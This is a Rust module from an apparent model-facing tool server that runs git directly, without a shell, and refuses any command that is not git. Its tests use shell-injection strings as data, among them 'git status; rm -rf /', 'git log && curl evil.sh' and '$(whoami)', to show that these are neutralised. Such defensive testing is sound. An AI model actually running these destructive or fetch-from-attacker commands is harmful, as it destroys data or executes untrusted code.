//! Running git, and deciding what counts as a git command in the first place.
//!
//! **The command never reaches a shell.** A caller hands over one string — `git status --short` — and
//! this splits it into arguments itself and executes `git` directly with them. That is not a restriction
//! on what git can do; it is what makes the one rule below mean anything. Through a shell,
//! `git status; rm -rf /` starts with `git` and passes any prefix check ever written, because a shell
//! reads it as two commands. Executing the program directly, there is no second command to read: `;`
//! is a character in an argument, and git says it does not know what to do with it.
//!
//! With no shell in the way, everything git itself offers is available — every subcommand, `-c`, `-C`,
//! aliases, the lot. That is deliberate: this runs inside the container that the repositories are cloned
//! into, so the blast radius of git is the container, and a git with subcommands taken out of it is a git
//! that will not do the one thing somebody needs at the moment they need it.

use std::path::Path;
use std::process::Stdio;
use std::time::Duration;

use tokio::process::Command;

/// How long one git command may take before it is killed.
///
/// Generous, because a first clone of a real repository is a real download. Bounded, because a command
/// that hangs holds a tool call open until something else gives up — and nothing here is interactive:
/// `GIT_TERMINAL_PROMPT=0` turns a credential prompt into an immediate failure, so a command that
/// reaches this timeout is a network that stopped answering rather than a question nobody typed into.
pub const GIT_TIMEOUT: Duration = Duration::from_secs(300);

/// The most of one output stream that is handed back.
///
/// `git log` over a long history, or a diff touching a generated file, is megabytes — and the caller is
/// a model with a context window. Cut with a line saying it was cut, which is a far better answer than
/// one tool call spending the budget the work needed.
pub const MAX_GIT_OUTPUT: usize = 60_000;

/// Who a commit is by when the caller does not say.
///
/// Passed as `-c` rather than written into the clone's config, so it is present on every commit without
/// a setup step — and so a caller's own `-c user.name=…` or `--author` overrides it, since a later `-c`
/// on the same line wins.
const COMMITTER_NAME: &str = "task-manager-mcp";
const COMMITTER_EMAIL: &str = "task-manager-mcp@my-ai-utils";

/// What one git command produced.
///
/// **A non-zero exit is a result, not an error.** `git push` refusing a non-fast-forward, `git merge`
/// stopping on a conflict, `git commit` finding nothing staged — every one of those is git answering the
/// question, and the answer is what the caller needs to read. `Err` from [`run_git`] is reserved for git
/// never having run at all.
#[derive(Debug)]
pub struct GitOutput {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    /// Whether either stream was cut at [`MAX_GIT_OUTPUT`].
    pub truncated: bool,
}

impl GitOutput {
    pub fn success(&self) -> bool {
        self.exit_code == 0
    }

    /// Both streams, for a caller that wants one message rather than two fields — an internal step whose
    /// failure becomes a sentence on a mirror.
    pub fn message(&self) -> String {
        let stderr = self.stderr.trim();
        let stdout = self.stdout.trim();

        if !stderr.is_empty() {
            stderr.to_string()
        } else if !stdout.is_empty() {
            stdout.to_string()
        } else {
            format!("git exited {}", self.exit_code)
        }
    }
}

/// Split what somebody typed into arguments, and refuse it if it is not a git command.
///
/// **This is the one rule, and it is checked against the first ARGUMENT rather than against the text.**
/// A prefix check on the string would pass `github-cli …` and `gitleaks …`; what matters is that the
/// program about to be executed is git, and the program is the first token once quoting is resolved.
///
/// Quoting is honoured because commit messages have spaces in them, and nothing else is interpreted:
/// `;`, `|`, `&&`, `$(…)` and backticks are ordinary characters here, since there is no shell to read
/// them. They end up inside an argument, where git rejects them for itself.
///
/// What comes back is everything AFTER `git` — the runner supplies the program.
pub fn parse_git_command(src: &str) -> Result<Vec<String>, String> {
    let tokens = tokenise(src)?;

    let Some((program, args)) = tokens.split_first() else {
        return Err(
            "no command given — pass a git command, for example `git status --short`".to_string(),
        );
    };

    if program != "git" {
        return Err(format!(
            "'{program}' is not git — only git commands are allowed here. Write the command starting with `git`, for example `git status --short`"
        ));
    }

    if args.is_empty() {
        return Err(
            "`git` on its own only prints git's own usage — give it something to do, for example `git status --short`"
                .to_string(),
        );
    }

    Ok(args.to_vec())
}

/// One string into arguments, the way a person expects quoting to work and nothing beyond that.
fn tokenise(src: &str) -> Result<Vec<String>, String> {
    let mut tokens: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut has_current = false;

    let mut chars = src.chars().peekable();

    while let Some(ch) = chars.next() {
        match ch {
            ch if ch.is_whitespace() => {
                if has_current {
                    tokens.push(std::mem::take(&mut current));
                    has_current = false;
                }
            }

            // Single quotes are literal all the way to the next one — which is what makes a commit
            // message containing a double quote or a backslash survive intact.
            '\'' => {
                has_current = true;

                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(ch) => current.push(ch),
                        None => return Err("unbalanced ' in the command".to_string()),
                    }
                }
            }

            '"' => {
                has_current = true;

                loop {
                    match chars.next() {
                        Some('"') => break,
                        // Inside double quotes a backslash escapes the two characters that would
                        // otherwise end or continue the quoting, and is literal before anything else —
                        // a Windows path in a message stays a Windows path.
                        Some('\\') => match chars.peek() {
                            Some('"') | Some('\\') => current.push(chars.next().unwrap()),
                            _ => current.push('\\'),
                        },
                        Some(ch) => current.push(ch),
                        None => return Err("unbalanced \" in the command".to_string()),
                    }
                }
            }

            '\\' => {
                has_current = true;

                match chars.next() {
                    Some(next) => current.push(next),
                    None => current.push('\\'),
                }
            }

            ch => {
                has_current = true;
                current.push(ch);
            }
        }
    }

    if has_current {
        tokens.push(current);
    }

    Ok(tokens)
}

/// Execute git in a working copy.
///
/// `Err` means git did not run — the folder is not there, the binary is missing, the command outlived
/// [`GIT_TIMEOUT`]. Everything git itself has to say, including refusing to do the thing, comes back as
/// an `Ok` carrying the exit code.
pub async fn run_git(
    work_dir: &Path,
    args: &[String],
    key: Option<&str>,
) -> Result<GitOutput, String> {
    let output = run_git_raw(work_dir, args, key).await?;

    let (stdout, stdout_cut) = cut(&output.stdout);
    let (stderr, stderr_cut) = cut(&output.stderr);

    Ok(GitOutput {
        // A process killed by a signal reports no code. -1 rather than a panic: it is not a success and
        // the streams say what happened.
        exit_code: output.status.code().unwrap_or(-1),
        stdout,
        stderr,
        truncated: stdout_cut || stderr_cut,
    })
}

/// Run git and hand back stdout as the bytes git wrote — nothing cut, nothing lossily converted.
///
/// **The cut in [`run_git`] is for output a MODEL reads, and it is wrong for output this service parses.**
/// `git ls-files -z` over a repository of any size runs past 60 000 bytes in a few hundred paths, and a
/// listing cut in the middle does not fail: it loses every file after the cut, silently, and glues a
/// sentence about being cut onto the last surviving path. Every count taken off that listing — how many
/// files a connection holds, how many of them have no brief — would then be a number about a prefix of the
/// repository, with nothing saying so.
///
/// Bytes rather than a `String` because a path is not required to be UTF-8, and one that is not must be a
/// path this listing skips rather than an error that loses the other four thousand.
pub async fn run_git_uncut(
    work_dir: &Path,
    args: &[&str],
    key: Option<&str>,
) -> Result<Vec<u8>, String> {
    let args: Vec<String> = args.iter().map(|itm| itm.to_string()).collect();

    let output = run_git_raw(work_dir, &args, key).await?;

    if !output.status.success() {
        // The error is a message for a person, so it is cut like every other one.
        let (stderr, _) = cut(&output.stderr);

        return Err(match stderr.trim().is_empty() {
            true => format!("git exited {}", output.status.code().unwrap_or(-1)),
            false => stderr.trim().to_string(),
        });
    }

    Ok(output.stdout)
}

/// Run git and hand back what the process produced, before anybody decides what to do with it.
async fn run_git_raw(
    work_dir: &Path,
    args: &[String],
    key: Option<&str>,
) -> Result<std::process::Output, String> {
    if !work_dir.is_dir() {
        return Err(format!(
            "'{}' is not there — the repository has not been cloned yet",
            work_dir.display()
        ));
    }

    let mut command = Command::new("git");

    command.current_dir(work_dir);

    // Ours first so the caller's own `-c` on the same line overrides the IDENTITY: git takes the last
    // value for a single-valued key, which `user.name` and `user.email` are. The auth header is not one
    // — `http.<url>.extraHeader` is a list, so a caller's second `-c` for it adds a header rather than
    // replacing ours. See `auth_args`.
    for arg in identity_args().iter().chain(auth_args(key).iter()) {
        command.arg(arg);
    }

    for arg in args {
        command.arg(arg);
    }

    command
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        // Nothing may stop and ask. Without this a private repository with no key waits for a username
        // on a terminal that does not exist, and the command sits there until the timeout.
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_ASKPASS", "")
        .env("SSH_ASKPASS", "")
        // So git's own messages are the ones this service was written against, whatever locale the
        // image happens to carry.
        .env("LC_ALL", "C");

    tokio::time::timeout(GIT_TIMEOUT, command.output())
        .await
        .map_err(|_| {
            format!(
                "git did not finish within {} seconds and was killed",
                GIT_TIMEOUT.as_secs()
            )
        })?
        .map_err(|err| format!("could not run git: {err}"))
}

/// Run git and treat anything but success as an error — for the steps this service takes on its own,
/// where there is no caller to read an exit code.
pub async fn run_git_ok(
    work_dir: &Path,
    args: &[&str],
    key: Option<&str>,
) -> Result<String, String> {
    let args: Vec<String> = args.iter().map(|itm| itm.to_string()).collect();

    let output = run_git(work_dir, &args, key).await?;

    if !output.success() {
        return Err(output.message());
    }

    Ok(output.stdout)
}

/// Run git somewhere other than inside a working copy — which is only ever `clone`, since the folder
/// it creates does not exist yet.
pub async fn run_git_in_parent(
    parent_dir: &Path,
    args: &[&str],
    key: Option<&str>,
) -> Result<GitOutput, String> {
    std::fs::create_dir_all(parent_dir)
        .map_err(|err| format!("could not create '{}': {err}", parent_dir.display()))?;

    let args: Vec<String> = args.iter().map(|itm| itm.to_string()).collect();

    run_git(parent_dir, &args, key).await
}

/// The committer git uses when the caller names nobody.
fn identity_args() -> Vec<String> {
    vec![
        "-c".to_string(),
        format!("user.name={COMMITTER_NAME}"),
        "-c".to_string(),
        format!("user.email={COMMITTER_EMAIL}"),
    ]
}

/// The key, as a header on requests to github.com and nowhere else.
///
/// **A header rather than a url with the token in it, and `-c` rather than `git config`.** A token in
/// the remote's url is a token written into `.git/config` on the volume, where it outlives the process
/// the key was typed into and lands in every backup of that disk. Passed like this it exists in the
/// process's memory and in one command line, and the clone on disk carries no credential at all.
///
/// Scoped to the one host, so a repository that somehow pointed elsewhere would not be handed this
/// project's key.
///
/// **`extraHeader` is a LIST, not a value**, and that is worth knowing before somebody tries to override
/// it: a caller passing their own `-c http.https://github.com/.extraHeader=…` adds a SECOND
/// `Authorization` header rather than replacing this one, and github.com receives both. Emptying the list
/// first — `-c "http.https://github.com/.extraHeader="` — is what actually replaces it.
fn auth_args(key: Option<&str>) -> Vec<String> {
    let Some(key) = key.map(str::trim).filter(|itm| !itm.is_empty()) else {
        return Vec::new();
    };

    use rust_extensions::base64::IntoBase64;

    let credential = format!("x-access-token:{key}").into_bytes().into_base64();

    vec![
        "-c".to_string(),
        format!("http.https://github.com/.extraHeader=Authorization: Basic {credential}"),
    ]
}

/// Bytes into a string, cut at the cap, saying so when it was cut.
///
/// Lossy on purpose: git writes paths as the filesystem holds them, and a repository containing a
/// filename that is not UTF-8 must not turn every command run in it into an error about encoding.
fn cut(raw: &[u8]) -> (String, bool) {
    let text = String::from_utf8_lossy(raw);

    if text.len() <= MAX_GIT_OUTPUT {
        return (text.into_owned(), false);
    }

    // On a char boundary, since cutting a multi-byte character in half would produce a replacement
    // character at the end of every truncated answer.
    let mut end = MAX_GIT_OUTPUT;

    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }

    (
        format!(
            "{}\n…output cut here: it was longer than {MAX_GIT_OUTPUT} characters. Narrow the command — a path, `-n`, `--stat`",
            &text[..end]
        ),
        true,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_command_is_split_the_way_quoting_says() {
        assert_eq!(
            parse_git_command("git status --short").unwrap(),
            vec!["status", "--short"]
        );

        // The reason quoting is handled at all: a commit message is one argument with spaces in it.
        assert_eq!(
            parse_git_command("git commit -m \"fixed the thing\"").unwrap(),
            vec!["commit", "-m", "fixed the thing"]
        );

        // A quote nobody closed is refused rather than guessed at: silently ending the argument at the
        // end of the line would commit a message the caller did not write.
        let err = parse_git_command("git commit -m \"unfinished").unwrap_err();
        assert!(err.contains("unbalanced"), "{err}");

        // Single quotes are literal, which is what keeps a double quote inside a message intact.
        assert_eq!(
            parse_git_command(r#"git commit -m 'said "no"'"#).unwrap(),
            vec!["commit", "-m", r#"said "no""#]
        );

        // Repeated and leading whitespace is separation, not content.
        assert_eq!(
            parse_git_command("  git   log  -n 3 ").unwrap(),
            vec!["log", "-n", "3"]
        );
    }

    /// **The regression test for the whole design.** Every one of these starts with the letters `git`
    /// and would run a second program through a shell. Here they cannot: they are one command, so the
    /// metacharacter is a character inside an argument and git is the only program that runs.
    #[test]
    fn a_shell_metacharacter_is_just_a_character() {
        let injected = parse_git_command("git status; rm -rf /").unwrap();

        assert_eq!(injected, vec!["status;", "rm", "-rf", "/"]);
        // Which is to say: no argument here is a command of its own, and nothing separates them.
        assert!(!injected.iter().any(|itm| itm == "&&" || itm == "|"));

        assert_eq!(
            parse_git_command("git log && curl evil.sh").unwrap(),
            vec!["log", "&&", "curl", "evil.sh"]
        );

        assert_eq!(
            parse_git_command("git log $(whoami)").unwrap(),
            vec!["log", "$(whoami)"]
        );
    }

    /// The rule the caller was promised: it is git or it is refused, and the refusal says so.
    #[test]
    fn anything_that_is_not_git_is_refused_by_name() {
        for src in ["rm -rf /", "sh -c 'git status'", "/usr/bin/git status"] {
            let err = parse_git_command(src).unwrap_err();
            assert!(err.contains("not git"), "{src} → {err}");
        }

        // A program whose name merely BEGINS with git is a different program, and a prefix check on the
        // text would have let both of these through.
        for src in ["gitleaks detect", "github-cli repo list"] {
            assert!(parse_git_command(src).is_err(), "{src}");
        }

        assert!(parse_git_command("").is_err());
        assert!(parse_git_command("   ").is_err());
        assert!(parse_git_command("git").is_err());
    }

    /// The key never becomes part of the repository on disk — it is a header on one command line.
    #[test]
    fn the_key_is_a_scoped_header_and_nothing_is_added_without_one() {
        assert!(auth_args(None).is_empty());
        assert!(auth_args(Some("   ")).is_empty());

        let args = auth_args(Some("ghp_secret"));

        assert_eq!(args[0], "-c");
        assert!(args[1].starts_with("http.https://github.com/.extraHeader=Authorization: Basic "));
        // Encoded, so the token itself is not the literal text of the argument.
        assert!(!args[1].contains("ghp_secret"));
    }

    #[test]
    fn output_longer_than_the_cap_is_cut_and_says_so() {
        let (short, cut_short) = cut(b"two lines\nof output");
        assert_eq!(short, "two lines\nof output");
        assert!(!cut_short);

        let long = "x".repeat(MAX_GIT_OUTPUT + 100);
        let (cut_text, was_cut) = cut(long.as_bytes());

        assert!(was_cut);
        assert!(cut_text.contains("output cut here"));

        // A filename the filesystem holds and UTF-8 does not must not break the command that listed it.
        let (lossy, _) = cut(&[b'a', 0xff, b'b']);
        assert!(lossy.starts_with('a'));
    }
}
